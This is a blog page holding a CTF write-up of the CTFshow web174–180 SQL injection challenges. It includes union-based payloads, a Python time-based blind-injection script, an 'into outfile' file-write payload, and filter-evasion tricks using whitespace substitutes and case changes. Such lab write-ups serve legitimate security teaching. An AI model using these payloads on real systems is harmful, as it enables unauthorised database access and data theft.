<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshow——web174-180（sql注入） - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTFshow——web174-180（sql注入）" />
<meta property="og:description" content="web174 这是用正则匹配检查是否有flag
先闭合
order by爆列数
爆数据库名 和 表名
1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--&#43; 有三个表名 一个一个试一下
虽然过滤了flag 但是没事 把他的password全显示出来就行
web175 正则匹配中\xnn代表的是ascii码为十六进制nn的字符串，本关过滤掉了ascii从0到127的字符
所以就不能用回显来做题
f1
用时间注入脚本
import requests url = &#34;http://c522efea-d585-469c-b1c9-3270d9055620.challenge.ctf.show/api/v5.php?id=1&#39; and &#34; result = &#39;&#39; i = 0 while True: i = i &#43; 1 head = 32 tail = 127 while head &lt; tail: mid = (head &#43; tail) &gt;&gt; 1 # payload = f&#39;1=if(ascii(substr(database(),{i},1))&gt;{mid},sleep(2),0)&#43;--&#43;&#39; # payload = f&#39;1=if(ascii(substr((select table_name from information_schema." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/a9ea40f4e4845aec21c9626056a68c62/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-19T20:29:58+08:00" />
<meta property="article:modified_time" content="2023-12-19T20:29:58+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshow——web174-180（sql注入）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h4><strong>web174</strong></h4> 
<p><img alt="" height="216" src="https://images2.imgbox.com/b7/68/zkefelZC_o.png" width="555"></p> 
<p>这是用正则匹配检查是否有flag</p> 
<p>先闭合</p> 
<p>order by爆列数</p> 
<p>爆数据库名 和 表名</p> 
<pre><code class="language-php">1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></pre> 
<p><img alt="" height="313" src="https://images2.imgbox.com/f1/52/vS1TmCty_o.png" width="1200"></p> 
<p>有三个表名 一个一个试一下</p> 
<p>虽然过滤了flag 但是没事 把他的password全显示出来就行</p> 
<p><img alt="" height="413" src="https://images2.imgbox.com/5b/e4/IHdBtwGA_o.png" width="1200"></p> 
<h4>web175</h4> 
<p><img alt="" height="215" src="https://images2.imgbox.com/a7/38/LzUeWuBX_o.png" width="579"></p> 
<p>正则匹配中\xnn代表的是ascii码为十六进制nn的字符串，本关过滤掉了ascii从0到127的字符</p> 
<p>所以就不能用回显来做题</p> 
<p>f1</p> 
<p>用时间注入脚本</p> 
<pre><code class="language-python">import requests

url = "http://c522efea-d585-469c-b1c9-3270d9055620.challenge.ctf.show/api/v5.php?id=1' and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'1=if(ascii(substr(database(),{i},1))&gt;{mid},sleep(2),0)+--+'
        # payload = f'1=if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},sleep(2),0)+--+'
        # payload = f'1=if(ascii(substr((select column_name from information_schema.columns where table_name='ctfshow_user5'),{i},1))&gt;{mid},sleep(2),0)+--+'
        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))&gt;{mid},sleep(2),0)+--+'
        try:
            r = requests.get(url + payload, timeout=0.5)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)</code></pre> 
<p><strong>注意这里的url路径！！！！！</strong></p> 
<p>f2 文件写入</p> 
<p>写入文件的前提是知道网站初始的目录，一般来说都是/var/www/html/</p> 
<p>构造payload</p> 
<blockquote>
  -1' union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/flag.txt' --+ 
</blockquote> 
<p>然后直接访问flag.txt</p> 
<p><img alt="" height="203" src="https://images2.imgbox.com/10/4e/uLMPdVQo_o.png" width="1010"></p> 
<h4>web176</h4> 
<p>先爆出有三列</p> 
<p>然后联合注入时发现select被注释掉 直接大小写绕过</p> 
<blockquote> 
 <p>-1' union Select password,2,3 from ctfshow_user--+</p> 
</blockquote> 
<h4>web177</h4> 
<p>这题过滤了空格 可以用<br> %09   TAB 键（水平）<br> %0a   新建一行<br> %0c   新的一页<br> %0d   return 功能<br> %0b   TAB 键（垂直）<br> %a0   空格</p> 
<p>/**/或者括号</p> 
<p>来替换空格</p> 
<p>注释符的“-- （空格）”也被过滤了 可以用%23（#）替换</p> 
<p>构造payload</p> 
<blockquote> 
 <p>'/**/Union/**/Select/**/1,2,group_concat(password)/**/from/**/ctfshow_user/**/where/**/username='flag'%23</p> 
</blockquote> 
<p>拿到flag</p> 
<p>也可以直接用万能钥匙</p> 
<blockquote> 
 <pre>'/**/or/**/1=1%23</pre> 
</blockquote> 
<p>直接拿到flag</p> 
<h4 style="background-color:transparent;">web178</h4> 
<p>过滤了/**/ 但是能用%0a</p> 
<p><img alt="" height="758" src="https://images2.imgbox.com/57/e9/iliROFgz_o.png" width="1200"></p> 
<blockquote> 
 <p>'%0aor%0a1=1%23</p> 
</blockquote> 
<h4 style="background-color:transparent;">web179</h4> 
<p>过滤了很多字符但%0c还能用</p> 
<blockquote> 
 <p>'%0cor%0c1=1%23</p> 
</blockquote> 
<h4 style="background-color:transparent;">web180</h4> 
<p>可以看到它这里屏蔽了注释%23</p> 
<p><img alt="" height="261" src="https://images2.imgbox.com/33/98/78mHlKyS_o.png" width="1076"></p> 
<p>但是这里的%0c还能照常使用</p> 
<p><img alt="" height="237" src="https://images2.imgbox.com/20/7c/KfiXEEZV_o.png" width="1188"> 利用‘1’=‘1闭合号来注释掉后面的语句</p> 
<p>构造payload</p> 
<blockquote> 
 <p>'%0cUnion%0cSelect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'or'1'='</p> 
</blockquote> 
<p>也可以构造巧妙的万能语句</p> 
<blockquote> 
 <pre>-1'or(id=26)and'1</pre> 
</blockquote> 
<p>前面我们已经知道表的结构是<code>id,username,password</code>，所以我们通过查id的方式去找flag，而用运算符中，<code>and</code>的优先级比<code>or</code>高，这句话放到查询语句中就变成了</p> 
<pre><code class="language-sql">id='-1'or(id=26)and'1' limit 1;
也就是
(id='-1') or ((id=26) and '1') limit 1;
前面为0，后面为1，所以整个条件为1</code></pre> 
<p> 参照 <a class="link-info" href="https://www.wlhhlc.top/posts/14827/#web180" rel="nofollow" title="https://www.wlhhlc.top/posts/14827/#web180">https://www.wlhhlc.top/posts/14827/#web180</a></p> 
<p><a class="link-info" href="https://blog.csdn.net/l2872253606/article/details/124952111" title="https://blog.csdn.net/l2872253606/article/details/124952111">https://blog.csdn.net/l2872253606/article/details/124952111</a></p> 
<p></p> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/83d9b642dbb1191f895d465635ee1c5b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">案例073:基于微信小程序的智慧旅游平台开发</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/886b061eea0b576e871915b79524f24d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">JAVA.JUC总结</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>